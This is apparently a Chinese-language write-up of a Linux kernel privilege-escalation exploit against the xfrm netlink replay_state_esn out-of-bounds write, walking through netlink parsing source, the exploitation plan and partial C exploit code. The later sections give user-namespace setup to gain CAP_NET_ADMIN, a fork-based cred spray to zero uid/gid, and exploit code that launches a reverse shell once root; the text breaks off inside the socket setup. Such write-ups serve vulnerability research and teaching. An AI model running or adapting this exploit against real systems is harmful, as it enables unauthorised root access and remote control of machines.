@@ -1,0 +1,252 @@
+> Netlink 是一种特殊的 socket，它是 Linux 所特有的，类似于 BSD 中的AF_ROUTE 但又远比它的功能强大。目前在Linux
+> 内核中使用netlink 进行应用与内核通信的应用很多; 包括：路由 daemon（NETLINK_ROUTE），用户态 socket
+> 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），netfilter
+> 子系统（NETLINK_NETFILTER），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT）， 通用
+> netlink（NETLINK_GENERIC）等。
+而基于`netlink`的内核通信与`socket`的通信方式一致，都是通过`sendto()，recvfrom()； sendmsg(),
+recvmsg()`的用户态`API`。
+而发送到内核态的数据以协议包的形式进行解析，因此需要了解`xfrm`数据包的协议格式，其协议结构图及相关函数图示如下。
+    /* ========================================================================
+     *         Netlink Messages and Attributes Interface (As Seen On TV)
+     * ------------------------------------------------------------------------     *                          Messages Interface
+     * ------------------------------------------------------------------------     *
+     * Message Format:
+     *    
+     *    
+     *   +----------+- - -+-------------+- - -+-------- - -     *   | nlmsghdr | Pad |   Payload   | Pad | nlmsghdr
+     *   +----------+- - -+-------------+- - -+-------- - -     *   nlmsg_data(nlh)---^                   ^
+     *   nlmsg_next(nlh)-----------------------+
+     *
+     * Payload Format:
+     *    
+     *           
+     *   +----------------------+- - -+--------------------------------+
+     *   |     Family Header    | Pad |           Attributes           |
+     *   +----------------------+- - -+--------------------------------+
+     *   nlmsg_attrdata(nlh, hdrlen)---^
+     *
+     * Data Structures:
+     *   struct nlmsghdr            netlink message header
+     * ------------------------------------------------------------------------     *                          Attributes Interface
+     * ------------------------------------------------------------------------     *
+     * Attribute Format:
+     *    
+     *    
+     *   +----------+- - -+- - - - - - - - - +- - -+-------- - -     *   |  Header  | Pad |     Payload      | Pad |  Header
+     *   +----------+- - -+- - - - - - - - - +- - -+-------- - -     *                           ^
+     *   nla_data(nla)----^                        |
+     *   nla_next(nla)-----------------------------'
+     *
+     * Data Structures:
+     *   struct nlattr          netlink attribute header
+从上图可以看出， **发送到内核的数据需要如下形式`nlmsghdr` \+ `Family Header` \+ `n * (nla +
+data)`。**
+首先从`xfrm_netlink_rcv`函数中调用[netlink_rcv_skb](https://elixir.bootlin.com/linux/v4.10.6/source/net/netlink/af_netlink.c#L2275)函数，会检查`nlmsg_type`及`nlmsg_len`范围，并交由`cb`函数处理，其赋值为`xfrm_user_rcv_msg`。
+    int netlink_rcv_skb(struct sk_buff *skb, int (*cb)(struct sk_buff *,
+                                 struct nlmsghdr *))
+    {
+        struct nlmsghdr *nlh;
+        int err;
+        while (skb->len >= nlmsg_total_size(0)) {
+            int msglen;
+            nlh = nlmsg_hdr(skb);
+            err = 0;
+            if (nlh->nlmsg_len len nlmsg_len)
+                return 0;
+            /* Only requests are handled by the kernel */
+            if (!(nlh->nlmsg_flags & NLM_F_REQUEST))
+                goto ack;
+            /* Skip control messages */
+            if (nlh->nlmsg_type nlmsg_flags & NLM_F_ACK || err)
+                netlink_ack(skb, nlh, err);
+    skip:
+            msglen = NLMSG_ALIGN(nlh->nlmsg_len);
+            if (msglen > skb->len)
+                msglen = skb->len;
+            skb_pull(skb, msglen);
+        }
+        return 0;
+    }
+在[xfrm_user_rcv_msg](https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L2444)函数中，会根据`nlmsg_type`到`xfrm_dispatch`中查找对应要调用的函数，并在[2]处检查对应需要的权限，而在[3]处会根据`nla`中参数类型，来初始化一个`**
+attr`，作为用户输入参数的索引。最终调用`link->doit`去执行。
+    static int xfrm_user_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
+    {
+        struct net *net = sock_net(skb->sk);
+        struct nlattr *attrs[XFRMA_MAX+1];
+        const struct xfrm_link *link;
+        int type, err;
+    #ifdef CONFIG_COMPAT
+        if (in_compat_syscall())
+            return -EOPNOTSUPP;
+    #endif
+        type = nlh->nlmsg_type;
+        if (type > XFRM_MSG_MAX)
+            return -EINVAL;
+        type -= XFRM_MSG_BASE;
+    [1] link = &xfrm_dispatch[type];
+        /* All operations require privileges, even GET */
+    [2] if (!netlink_net_capable(skb, CAP_NET_ADMIN)) //检查进程权限
+            return -EPERM;
+        if ((type == (XFRM_MSG_GETSA - XFRM_MSG_BASE) ||
+             type == (XFRM_MSG_GETPOLICY - XFRM_MSG_BASE)) &&
+            (nlh->nlmsg_flags & NLM_F_DUMP)) {
+            if (link->dump == NULL)
+                return -EINVAL;
+            {
+                struct netlink_dump_control c = {
+                    .dump = link->dump,
+                    .done = link->done,
+                };
+                return netlink_dump_start(net->xfrm.nlsk, skb, nlh, &c);
+            }
+        }
+    [3] err = nlmsg_parse(nlh, xfrm_msg_min[type], attrs,
+                  link->nla_max ? : XFRMA_MAX,
+                  link->nla_pol ? : xfrma_policy);
+        if (err doit == NULL)
+            return -EINVAL;
+        return link->doit(skb, nlh, attrs);
+    }
+从`xfrm_dispatch`可见，我们所需的`XFRM_MSG_NEWSA`及`XFRM_MSG_NEWAE`，仅需将`nlmsg_type`设置为相应值即可。
+    xfrm_dispatch[XFRM_NR_MSGTYPES] = {
+        [XFRM_MSG_NEWSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },
+        [XFRM_MSG_DELSA       - XFRM_MSG_BASE] = { .doit = xfrm_del_sa        },
+        [XFRM_MSG_GETSA       - XFRM_MSG_BASE] = { .doit = xfrm_get_sa,
+                               .dump = xfrm_dump_sa,
+                               .done = xfrm_dump_sa_done  },
+        [XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
+        [XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },
+        [XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,
+                               .dump = xfrm_dump_policy,
+                               .done = xfrm_dump_policy_done },
+        [XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },
+        [XFRM_MSG_ACQUIRE     - XFRM_MSG_BASE] = { .doit = xfrm_add_acquire   },
+        [XFRM_MSG_EXPIRE      - XFRM_MSG_BASE] = { .doit = xfrm_add_sa_expire },
+        [XFRM_MSG_UPDPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
+        [XFRM_MSG_UPDSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },
+        [XFRM_MSG_POLEXPIRE   - XFRM_MSG_BASE] = { .doit = xfrm_add_pol_expire},
+        [XFRM_MSG_FLUSHSA     - XFRM_MSG_BASE] = { .doit = xfrm_flush_sa      },
+        [XFRM_MSG_FLUSHPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_flush_policy  },
+        [XFRM_MSG_NEWAE       - XFRM_MSG_BASE] = { .doit = xfrm_new_ae  },
+        [XFRM_MSG_GETAE       - XFRM_MSG_BASE] = { .doit = xfrm_get_ae  },
+        [XFRM_MSG_MIGRATE     - XFRM_MSG_BASE] = { .doit = xfrm_do_migrate    },
+        [XFRM_MSG_GETSADINFO  - XFRM_MSG_BASE] = { .doit = xfrm_get_sadinfo   },
+        [XFRM_MSG_NEWSPDINFO  - XFRM_MSG_BASE] = { .doit = xfrm_set_spdinfo,
+                               .nla_pol = xfrma_spd_policy,
+                               .nla_max = XFRMA_SPD_MAX },
+        [XFRM_MSG_GETSPDINFO  - XFRM_MSG_BASE] = { .doit = xfrm_get_spdinfo   },
+    };
+而`Family
+Header`需要到对应的处理函数中找，以`xfrm_add_sa`为例，其调用`nlmsg_data`函数的赋值变量类型为`xfrm_usresa_info`，即为`Family
+Header`。
+    struct xfrm_usersa_info *p = nlmsg_data(nlh);
+## 利用思路
+### 权限限制
+所谓权限限制即是在上文中提到的`netlink_net_capable(skb,
+CAP_NET_ADMIN)`检查，所需为`CAP_NET_ADMIN`权限。但在`Linux`操作系统中存在命名空间这样的权限隔离机制，在每一个`NET`沙箱中，非`ROOT`进程可以具有`CAP_NET_ADMIN`权限。查看命名空间开启的方式为`cat
+/boot/config* | grep CONFIG_USER_NS`，若为“y”，则启用了命名空间。
+而对于上述限制的绕过有两种方法，一是使用`setcap`命令为`EXP`赋予权限，即执行`sudo setcap
+cap_net_raw,cap_net_admin=eip
+./exp`。二是仿照[CVE-2017-7308](https://github.com/ret2p4nda/linux-kernel-exploits/tree/master/2017/CVE-2017-7308)中设置`namespace
+sandbox`，但注意此时无法利用`getuid`来判断是否为`root`用户。
+    void setup_sandbox() {
+        int real_uid = getuid();
+        int real_gid = getgid();
+            if (unshare(CLONE_NEWUSER) != 0) {
+            perror("[-] unshare(CLONE_NEWUSER)");
+            exit(EXIT_FAILURE);
+        }
+            if (unshare(CLONE_NEWNET) != 0) {
+            perror("[-] unshare(CLONE_NEWUSER)");
+            exit(EXIT_FAILURE);
+        }
+        if (!write_file("/proc/self/setgroups", "deny")) {
+            perror("[-] write_file(/proc/self/set_groups)");
+            exit(EXIT_FAILURE);
+        }
+        if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
+            perror("[-] write_file(/proc/self/uid_map)");
+            exit(EXIT_FAILURE);
+        }
+        if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
+            perror("[-] write_file(/proc/self/gid_map)");
+            exit(EXIT_FAILURE);
+        }
+        cpu_set_t my_set;
+        CPU_ZERO(&my_set);
+        CPU_SET(0, &my_set);
+        if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
+            perror("[-] sched_setaffinity()");
+            exit(EXIT_FAILURE);
+        }
+        if (system("/sbin/ifconfig lo up") != 0) {
+            perror("[-] system(/sbin/ifconfig lo up)");
+            exit(EXIT_FAILURE);
+        }
+    }
+### 数据包构造
+本漏洞属于一个利用条件比较宽松的漏洞。首先，`xfrm_replay_state_esn`是一个变长的数据结构，而其长度可以由用户输入的`bmp_len`来控制，并由`kzalloc`申请`bmp_len
+*4 + 0x18`大小的内存块。其次，越界读写可以每次写1`bit`大小的数据，同时也可以将`(replay_windows
+-1)>>5`比特大小的内存块清空。
+并且`cred`结构体的申请是通过`prepare_creds`中的`new = kmem_cache_alloc(cred_jar,
+GFP_KERNEL);`得到的，但在调试中发现，本内核的`cred_jar`是`kmalloc-192`。
+根据内核分配使用的`slub`+伙伴算法可以知道，对于同一个`kmem_cache`分配出来的内存块有一定概率是相邻。因此一种很取巧的思路，就是将`xfrm_replay_state_esn`结构体设置为`192(0xc0)`以内，以利用`kmalloc-192`进行分配，并利用`fork`新建大量进程，使申请大量`cred`，这样喷射之后有很大概率越界读写漏洞存在的位置之后就是一个`cred`结构体，这样利用之前提到过的置零一段内存的操作就可以将`cred`结构体中的部分成员`(uid
+gid等)`置零，从而对该进程提权，并通过反弹`shell`就可以得到一个`root`权限的`shell`。
+因此对于数据包构造主要根据上述思路。
+**xfrm_add_sa**
+在触发`xfrm_add_sa`函数的数据包中，需要满足`128 =
+replay_esn->replay_window`，其中`diff`的数据由`xfrm_replay_state_esn`中的`seq`、`seq_hi`及`AH`的`seq`共同决定。还行需在后续单字节写的位置，将`cred`结构体中`usage`置回原值。
+在`xfrm_replay_advance_esn`函数执行前后发现，相邻`cred`中的成员被置零。
+## EXP
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #define MAX_PAYLOAD 4096
+    struct ip_auth_hdr {
+        __u8    nexthdr;
+        __u8    hdrlen;
+        __be16  reserved;   /* big endian */
+        __be32  spi;        /* big endian */
+        __be32  seq_no;     /* big endian */
+        __u8    auth_data[8];
+    };
+    void fork_spary_n(int n,unsigned int time){
+        int i;
+        for(i = 0;i < n;i++){
+            int pid ;
+            pid = fork();
+            if(pid ==0){
+                sleep(time);
+                if(getuid() == 0){
+                    fprintf(stderr, "[+] now get r00t\n" );
+                    system("id");
+                    system("/home/p4nda/Desktop/reverse_shell");
+                }
+                else{
+                    exit(0);
+                }
+            }
+        }
+    }
+    int init_xfrm_socket(){
+        struct sockaddr_nl addr; 
+        int result = -1,xfrm_socket;
+        xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+        if (xfrm_socket<=0){
+            perror("[-] bad NETLINK_XFRM socket ");
+            return result;
+        }
+        addr.nl_family = PF_NETLINK;  
+        addr.nl_pad    = 0;  
+        addr.nl_pid    = getpid();  
+        addr.nl_groups = 0;
+        result = bind(xfrm_socket, (struct sockaddr *)&addr, sizeof(addr));
